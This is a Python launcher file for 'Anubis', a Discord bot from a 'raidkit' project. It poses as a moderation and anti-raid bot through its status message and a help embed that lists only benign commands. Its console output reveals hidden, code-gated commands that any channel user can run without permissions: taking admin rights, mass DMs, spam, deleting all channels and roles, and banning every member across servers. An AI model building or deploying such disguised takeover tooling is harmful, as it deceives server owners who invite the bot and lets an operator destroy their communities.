# Scripted by Catterall (https://github.com/Catterall).
# Bot under the GNU General Public Liscense v2 (1991).


# Modules.

import discord
import os
import json
import asyncpg
import random as r
import requests
import re
from bs4 import BeautifulSoup
from discord.ext import commands, tasks
from itertools import cycle
from colorama import Style, Back, Fore, init
init()

def find_updates():
    THIS_VERSION = "1.3.0"

    header = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36", 
    "X-Requested-With": "XMLHttpRequest"}
    url = f"https://github.com/Catterall/discord-raidkit/releases/latest"

    os.system('cls')
    print("Searching for updates.")
    r = requests.get(url, headers=header)
    os.system('cls')
    soup = str(BeautifulSoup(r.text, 'html.parser'))
    s1 = re.search('<title>', soup)
    s2 = re.search('·', soup)
    result_string = soup[s1.end():s2.start()]
    if THIS_VERSION not in result_string:
        s3 = re.search('originating_url":"', soup)
        s4 = re.search('","user_id":null', soup)
        update_link = soup[s3.end():s4.start()]
        print(Style.BRIGHT + Fore.LIGHTYELLOW_EX + f'''






                   ███╗   ██╗███████╗██╗    ██╗    ██╗   ██╗██████╗ ██████╗  █████╗ ████████╗███████╗██╗
                   ████╗  ██║██╔════╝██║    ██║    ██║   ██║██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██║
                   ██╔██╗ ██║█████╗  ██║ █╗ ██║    ██║   ██║██████╔╝██║  ██║███████║   ██║   █████╗  ██║
                   ██║╚██╗██║██╔══╝  ██║███╗██║    ██║   ██║██╔═══╝ ██║  ██║██╔══██║   ██║   ██╔══╝  ╚═╝
                   ██║ ╚████║███████╗╚███╔███╔╝    ╚██████╔╝██║     ██████╔╝██║  ██║   ██║   ███████╗██╗
                   ╚═╝  ╚═══╝╚══════╝ ╚══╝╚══╝      ╚═════╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝
                                                                                     

              {Fore.LIGHTRED_EX}Human. There has been a brand new update to the discord raidkit. You can find the update here:
    
                             {Fore.LIGHTBLUE_EX}{update_link}
                            
                                             {Fore.WHITE}(Enter anything to continue) '''.replace('█', f'{Fore.YELLOW}█{Fore.LIGHTGREEN_EX}'), end=f"\n\n{' '*59}")
    input()
    
    return


find_updates()


# Message to be displayed if an error is encountered when starting the bot.

def startError():
    os.system('cls')
    print(Fore.BLUE + f'''


                                      █████╗ ███╗   ██╗██╗   ██╗██████╗ ██╗███████╗
                                     ██╔══██╗████╗  ██║██║   ██║██╔══██╗██║██╔════╝
                                     ███████║██╔██╗ ██║██║   ██║██████╔╝██║███████╗
                                     ██╔══██║██║╚██╗██║██║   ██║██╔══██╗██║╚════██║
                                     ██║  ██║██║ ╚████║╚██████╔╝██████╔╝██║███████║
                                     ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═════╝ ╚═╝╚══════╝


      {Fore.WHITE}Human. The settings, defined in {Fore.RED}run_settings.json{Fore.WHITE}, are invalid. The following measures may solve the issue:



{Fore.GREEN}-{Fore.WHITE}The PostgreSQL master password specified may be incorrect - perhaps do a double-take?
{Fore.GREEN}-{Fore.WHITE}The bot prefix specified may be invalid - a prefix must be provided in order to use the bot's commands.
{Fore.GREEN}-{Fore.WHITE}The bot token specified may be incorrect - try regenerating a new bot token and use that token instead.
{Fore.GREEN}-{Fore.WHITE}If the settings file is missing, try running the program again. If the issue persists, view the GitHub page.


{Style.DIM}{Fore.GREEN}If the issue persists after all the above measures are taken, you can create an issue here:
{Style.BRIGHT}{Back.RESET}{Fore.WHITE}https://github.com/Catterall/discord-raidkit/issues

{Fore.YELLOW}Thank you for using Anubis and apologies for all errors encountered! -Catterall.
'''.replace('█', f'{Fore.WHITE}█{Fore.BLUE}'))
    close = input("")
    os._exit(0)

if os.path.isfile('cogs/temp.txt'):
    os.remove('cogs/temp.txt')

with open('cogs/temp.txt', 'w') as f:
    CODE = r.randint(1000, 9999)
    f.write(str(CODE))
    f.close()

#  Regenerate JSON file if lost.

try:
    with open('run_settings.json', 'r') as f:
        data = json.load(f)
except FileNotFoundError:
    data = {}
    data["postgresql_password"] = "Replace this text with the postgresql password you set"
    data["prefix"] = "a!"
    data["token"] = "Replace this text with your bot token"
    with open('run_settings.json', 'w') as f:
        json.dump(data, f, indent=4)
        f.close()

#  Regenerate server file if lost.

try:
    with open('cogs/servers.txt', 'r') as f:
        f.close()
except FileNotFoundError:
    with open('cogs/servers.txt', 'w') as f:
        f.close()

# Sets the bot prefix to the prefix specified in the JSON file.

if data.get("prefix").strip().replace(" ", "") == "":
    startError()
else:
    bot = commands.Bot(command_prefix=data.get("prefix"))

# Status' to be cycled continously as the bot runs.
# You add or change these status' here - make sure to have at least one.

status = cycle(['against raiders!', f'{data.get("prefix")}help for commands!'])

# Removes the default help command (Help command is replaced by an embed further down in the code).

bot.remove_command('help')


# Creates the database pool from the postresql database "levels_db" set up in the installation (See README.md).

async def create_db_pool():
    try:
        bot.pg_con = await asyncpg.create_pool(database="levels_db", user="postgres", password=data.get("postgresql_password"))
    except:
        startError()


# Load/Unload/Reload: Used for messing with Cogs.

@bot.command()
async def load(ctx, extension):
    bot.load_extension(f'cogs.{extension}')
    embed = discord.Embed(title="Extension loaded",
                          description=f"{extension} has been loaded.", color=discord.Colour.green())
    await ctx.send(embed=embed)


@bot.command()
async def unload(ctx, extension):
    bot.unload_extension(f'cogs.{extension}')
    embed = discord.Embed(title="Extension unloaded",
                          description=f"{extension} has been unloaded.", color=discord.Colour.green())
    await ctx.send(embed=embed)


@bot.command()
async def reload(ctx, extension):
    bot.unload_extension(f'cogs.{extension}')
    bot.load_extension(f'cogs.{extension}')
    embed = discord.Embed(title="Extension reloaded",
                          description=f"{extension} has been reloaded.", color=discord.Colour.green())
    await ctx.send(embed=embed)


# On ready.

@bot.event
async def on_ready():
    global CODE
    change_status.start()
    os.system('cls')
    print(Fore.BLUE + f'''     
                                    ███████╗███╗   ██╗██╗   ██╗██████╗ ██╗███████╗
                                    ██╔══██║████╗  ██║██║   ██║██╔══██╗██║██╔════╝
                                    ███████║██╔██╗ ██║██║   ██║██████╔╝██║███████╗
                                    ██╔══██║██║╚██╗██║██║   ██║██╔══██╗██║╚════██║
                                    ██║  ██║██║ ╚████║╚██████╔╝██████╔╝██║███████║
                                    ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═════╝ ╚═╝╚══════╝

{Fore.WHITE}{Back.BLUE}The following commands can be used in any text channel within the target server - permissions are not needed:
{Back.RESET}{Style.DIM}{Fore.RED}{data.get('prefix')}leave {CODE} <server>: Makes the bot leave a server.
{Style.BRIGHT}{Fore.LIGHTRED_EX}{data.get('prefix')}mass_leave {CODE}: Makes the bot leave every server.
{Style.DIM}{Fore.YELLOW}{data.get('prefix')}nick_all {CODE} <nickname>: Change the nickname of all members on a server.
{Style.NORMAL}{Fore.GREEN}{data.get('prefix')}mass_dm {CODE} <message>: Message all of the members on a server with a custom message.
{Fore.BLUE}{data.get('prefix')}spam {CODE} <message>: Repeatedly spam all text channels on a server with a custom message.
{Style.DIM}{Fore.MAGENTA}{data.get('prefix')}cpurge {CODE}: Delete all channels on a server.
{Style.BRIGHT}{Fore.LIGHTMAGENTA_EX}{data.get('prefix')}admin {CODE} <role_name>: Gain administrator privileges on a server via an admin role created by the bot.
{Style.DIM}{Fore.RED}{data.get('prefix')}nuke {CODE}: Ban all members, then delete all roles, then delete all channels, then delete all emojis on a server.
{Style.BRIGHT}{Fore.LIGHTRED_EX}{data.get('prefix')}mass_nuke {CODE}: Nuke every server the bot is currently in.
{Style.DIM}{Fore.YELLOW}{data.get('prefix')}raid {CODE} <role_name> <nickname> <channel_name> <num_of_channels> <message>:
Delete all channels, then delete all roles, then give everyone a new role, then nickname everyone a new nickname,
then create x number of channels, then message everyone with a message, then spam all channels with a message.

{Style.DIM}{Fore.GREEN}Additional notes:
{Style.BRIGHT}{Back.RESET}{Fore.WHITE}Before running the nuke commands, make sure the role created by the bot upon its invite is above the roles of the
members you wish to ban (i.e. move the role as high as possible).

{Fore.LIGHTCYAN_EX}To refresh this window back to this page, use the command: {Fore.LIGHTGREEN_EX}{data.get('prefix')}refresh {CODE}

{Fore.LIGHTRED_EX}Anubis created by Catterall (View for full guide): {Fore.WHITE}https://www.github.com/Catterall{Style.DIM}{Fore.RED}'''.replace('█', f'{Fore.WHITE}█{Fore.BLUE}'))

# On joining a server.

@bot.event
async def on_guild_join(guild):
    with open('cogs/servers.txt', 'a') as f:
        f.write(str(guild.id)+"\n")
        f.close()

# On error (error handling).

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        embed = discord.Embed(
            title="Error", description=f"**Permission denied.**", color=discord.Colour.red())
        await ctx.send(embed=embed)
    if isinstance(error, commands.NotOwner):
        embed = discord.Embed(
            title="Error", description=f"**You must be the owner to use this command.**", color=discord.Colour.red())
        await ctx.send(embed=embed)
    if isinstance(error, commands.CheckFailure):
        embed = discord.Embed(
            title="Error", description=f"**Access denied.**", color=discord.Colour.red())
        await ctx.send(embed=embed)
    else:
        print(error)


# Help embed.

@bot.command()
async def help(ctx):
    missing_perms = False
    author = ctx.message.author
    embed = discord.Embed(colour=discord.Color.gold())
    embed.set_author(name=f"Here's a list of my commands!")

    if not author.guild_permissions.manage_messages and not author.guild_permissions.kick_members and not author.guild_permissions.ban_members and not author.guild_permissions.administrator and not author.guild_permissions.mute_members:
        embed.add_field(name="**No permissions for moderator commands!**",
                        value="You lack every permission used by the moderator commands.", inline=False)
        missing_perms = True
    else:
        embed.add_field(name="**Moderation:**",
                        value="My moderation commands are:", inline=False)
        if author.guild_permissions.manage_messages:
            embed.add_field(
                name=f"{data.get('prefix')}clear [1-1000]", value="Clears messages from a channel.", inline=False)
        else:
            missing_perms = True
        if author.guild_permissions.kick_members:
            embed.add_field(
                name=f"{data.get('prefix')}kick <member> [reason]", value="Kicks a member from the server.", inline=False)
        else:
            missing_perms = True
        if author.guild_permissions.ban_members:
            embed.add_field(
                name=f"{data.get('prefix')}ban <member> [reason]", value="Bans a member from the server.", inline=False)
        else:
            missing_perms = True
        if author.guild_permissions.administrator:
            embed.add_field(name=f"{data.get('prefix')}unban <member>",
                            value="Unbans a member from the server.", inline=False)
        else:
            missing_perms = True
        if author.guild_permissions.mute_members:
            embed.add_field(
                name=f"{data.get('prefix')}mute <member> [reason]", value="Mutes a member on the server.", inline=False)
            embed.add_field(name=f"{data.get('prefix')}unmute <member>",
                            value="Unmutes a member on the server.", inline=False)
        else:
            missing_perms = True

    if not author.guild_permissions.mute_members and not author.guild_permissions.administrator:
        embed.add_field(name="**No permissions for anti-raid commands!**",
                        value="You lack every permission used by the anti-raid commands.", inline=False)
        missing_perms = True
    else:
        embed.add_field(name="**Anti-Raid:**",
                        value="My anti-raid commands are:", inline=False)
        if author.guild_permissions.administrator:
            embed.add_field(name=f"{data.get('prefix')}db_add_member <member>",
                            value="Adds a member to my raider database.", inline=False)
            embed.add_field(name=f"{data.get('prefix')}db_del_member <member>",
                            value="Removes a member from my raider database.", inline=False)
        else:
            missing_perms = True
        if author.guild_permissions.mute_members:
            embed.add_field(name=f"{data.get('prefix')}lock",
                            value="Locks down current text channel during a raid.", inline=False)
            embed.add_field(name=f"{data.get('prefix')}unlock",
                            value="Unlocks current text channel after a raid.", inline=False)
        else:
            missing_perms = True

    embed.add_field(name="**Levelling:**",
                    value="My levelling commands are:", inline=False)
    embed.add_field(name=f"{data.get('prefix')}level",
                    value="Shows your current level and XP.", inline=False)
    embed.add_field(name=f"{data.get('prefix')}dailyxp",
                    value="Gives you your daily XP.", inline=False)
    embed.add_field(name="**Status:**",
                    value="My status commands are:", inline=False)
    embed.add_field(name=f"{data.get('prefix')}latency",
                    value="Shows you my latency in milliseconds (ms).", inline=False)
    embed.add_field(name="**Surfing:**",
                    value="My surfing commands are:", inline=False)
    embed.add_field(name=f"{data.get('prefix')}define <word>",
                    value="Shows you the definition of any word.", inline=False)

    if missing_perms:
        embed.set_footer(
            text="Notice: You are missing permissions to view certain commands.")

    await author.send(embed=embed)


# Cycle through status every ten seconds.
# Change this value to however long you want each status to last (integer).

@tasks.loop(seconds=10)
async def change_status():
    await bot.change_presence(activity=discord.Game(next(status)))


# Search the "Cogs" folder for Cogs.

for filename in os.listdir('./cogs'):
    if filename.endswith('.py'):
        bot.load_extension(f'cogs.{filename[:-3]}')


# Asycio loop.

bot.loop.run_until_complete(create_db_pool())

# Run the bot using the token specified in the JSON file.

try:
    bot.run(data.get("token"))
except:
    startError()
    os._exit(1)

# Scripted by Catterall (https://github.com/Catterall).
# Bot under the GNU General Public Liscense v2 (1991).
